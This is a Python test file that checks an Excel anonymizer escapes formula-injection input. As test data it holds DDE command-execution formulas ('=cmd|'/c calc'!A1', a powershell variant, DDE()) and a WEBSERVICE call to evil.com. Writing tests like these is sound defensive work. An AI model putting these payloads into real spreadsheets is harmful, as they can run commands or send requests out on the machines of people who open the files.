"""
Tests for Excel formula injection prevention
"""

import pytest
import sys
import os
import tempfile
from pathlib import Path

# Add parent directory to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from openpyxl import Workbook, load_workbook
from anonymizer.excel_anonymizer import ExcelAnonymizer, ExcelColumnRule


class TestFormulaInjection:
    """Test Excel formula injection prevention"""

    def test_formula_injection_escaped_equals(self):
        """Test that formulas starting with = are escaped"""
        # Create test workbook with dangerous formula
        wb = Workbook()
        ws = wb.active
        ws.append(["Name", "Formula"])
        ws.append(["Test", "=1+1"])

        # Save and reload
        with tempfile.NamedTemporaryFile(suffix='.xlsx', delete=False) as f:
            output_path = Path(f.name)

        try:
            # Process through anonymizer (which should escape formulas)
            rules = [
                ExcelColumnRule({
                    'id': 'test-rule',
                    'columnName': 'Formula',
                    'columnType': 'text',
                    'anonymizationType': 'replace',
                    'replaceWith': '=cmd|"/c calc"!A1'  # Dangerous formula
                })
            ]

            ExcelAnonymizer.process_excel_file(
                Path(tempfile.gettempdir()) / 'test.xlsx',  # Dummy input path
                output_path,
                rules,
                preserve_headers=True
            )

            # Reload and check
            wb_loaded = load_workbook(output_path)
            ws_loaded = wb_loaded.active

            # Check that formula was escaped (should start with ')
            formula_cell = ws_loaded.cell(row=2, column=2)
            assert str(formula_cell.value).startswith("'"), f"Formula not escaped: {formula_cell.value}"

        finally:
            # Cleanup
            if output_path.exists():
                output_path.unlink()

    def test_formula_injection_escaped_plus(self):
        """Test that formulas starting with + are escaped"""
        wb = Workbook()
        ws = wb.active
        ws.append(["Value"])
        ws.append(["+WEBSERVICE('http://evil.com')"])

        with tempfile.NamedTemporaryFile(suffix='.xlsx', delete=False) as f:
            output_path = Path(f.name)

        try:
            # Create temporary input file
            with tempfile.NamedTemporaryFile(suffix='.xlsx', delete=False) as f_in:
                input_path = Path(f_in.name)
            wb.save(input_path)

            # Process through anonymizer
            rules = []  # No rules, just test final formula escaping pass
            ExcelAnonymizer.process_excel_file(input_path, output_path, rules)

            # Reload and check
            wb_loaded = load_workbook(output_path)
            ws_loaded = wb_loaded.active

            # Check that formula was escaped
            cell = ws_loaded.cell(row=2, column=1)
            assert str(cell.value).startswith("'"), f"Plus formula not escaped: {cell.value}"

        finally:
            # Cleanup
            if output_path.exists():
                output_path.unlink()
            if input_path.exists():
                input_path.unlink()

    def test_formula_injection_escaped_minus(self):
        """Test that formulas starting with - are escaped"""
        wb = Workbook()
        ws = wb.active
        ws.append(["Calc"])
        ws.append(["-SUM(A1:A10)"])

        with tempfile.NamedTemporaryFile(suffix='.xlsx', delete=False) as f:
            output_path = Path(f.name)

        try:
            # Create temporary input file
            with tempfile.NamedTemporaryFile(suffix='.xlsx', delete=False) as f_in:
                input_path = Path(f_in.name)
            wb.save(input_path)

            # Process
            rules = []
            ExcelAnonymizer.process_excel_file(input_path, output_path, rules)

            # Check
            wb_loaded = load_workbook(output_path)
            ws_loaded = wb_loaded.active
            cell = ws_loaded.cell(row=2, column=1)
            assert str(cell.value).startswith("'"), f"Minus formula not escaped: {cell.value}"

        finally:
            if output_path.exists():
                output_path.unlink()
            if input_path.exists():
                input_path.unlink()

    def test_formula_injection_escaped_at(self):
        """Test that formulas starting with @ are escaped"""
        wb = Workbook()
        ws = wb.active
        ws.append(["Ref"])
        ws.append(["@INDIRECT(A1)"])

        with tempfile.NamedTemporaryFile(suffix='.xlsx', delete=False) as f:
            output_path = Path(f.name)

        try:
            with tempfile.NamedTemporaryFile(suffix='.xlsx', delete=False) as f_in:
                input_path = Path(f_in.name)
            wb.save(input_path)

            rules = []
            ExcelAnonymizer.process_excel_file(input_path, output_path, rules)

            wb_loaded = load_workbook(output_path)
            ws_loaded = wb_loaded.active
            cell = ws_loaded.cell(row=2, column=1)
            assert str(cell.value).startswith("'"), f"At formula not escaped: {cell.value}"

        finally:
            if output_path.exists():
                output_path.unlink()
            if input_path.exists():
                input_path.unlink()

    def test_formula_injection_normal_text_unchanged(self):
        """Test that normal text is not modified"""
        wb = Workbook()
        ws = wb.active
        ws.append(["Text"])
        ws.append(["Normal text"])
        ws.append(["123"])
        ws.append(["email@example.com"])

        with tempfile.NamedTemporaryFile(suffix='.xlsx', delete=False) as f:
            output_path = Path(f.name)

        try:
            with tempfile.NamedTemporaryFile(suffix='.xlsx', delete=False) as f_in:
                input_path = Path(f_in.name)
            wb.save(input_path)

            rules = []
            ExcelAnonymizer.process_excel_file(input_path, output_path, rules)

            wb_loaded = load_workbook(output_path)
            ws_loaded = wb_loaded.active

            # Check that normal text is unchanged
            assert ws_loaded.cell(row=2, column=1).value == "Normal text"
            assert ws_loaded.cell(row=3, column=1).value == "123"
            assert ws_loaded.cell(row=4, column=1).value == "email@example.com"

        finally:
            if output_path.exists():
                output_path.unlink()
            if input_path.exists():
                input_path.unlink()

    def test_formula_injection_cmd_rce(self):
        """Test that RCE formulas are escaped"""
        # Dangerous formula that could execute commands
        dangerous_formulas = [
            "=cmd|'/c calc'!A1",
            "=cmd|'/c powershell'!A1",
            "=DDE(\"cmd\",\"/c calc\",\"\")",
        ]

        for formula in dangerous_formulas:
            wb = Workbook()
            ws = wb.active
            ws.append(["Attack"])
            ws.append([formula])

            with tempfile.NamedTemporaryFile(suffix='.xlsx', delete=False) as f:
                output_path = Path(f.name)

            try:
                with tempfile.NamedTemporaryFile(suffix='.xlsx', delete=False) as f_in:
                    input_path = Path(f_in.name)
                wb.save(input_path)

                rules = []
                ExcelAnonymizer.process_excel_file(input_path, output_path, rules)

                wb_loaded = load_workbook(output_path)
                ws_loaded = wb_loaded.active
                cell = ws_loaded.cell(row=2, column=1)

                # Should be escaped with '
                assert str(cell.value).startswith("'"), f"RCE formula not escaped: {formula}"
                # Should not be executable
                assert not str(cell.value).startswith("=")

            finally:
                if output_path.exists():
                    output_path.unlink()
                if input_path.exists():
                    input_path.unlink()
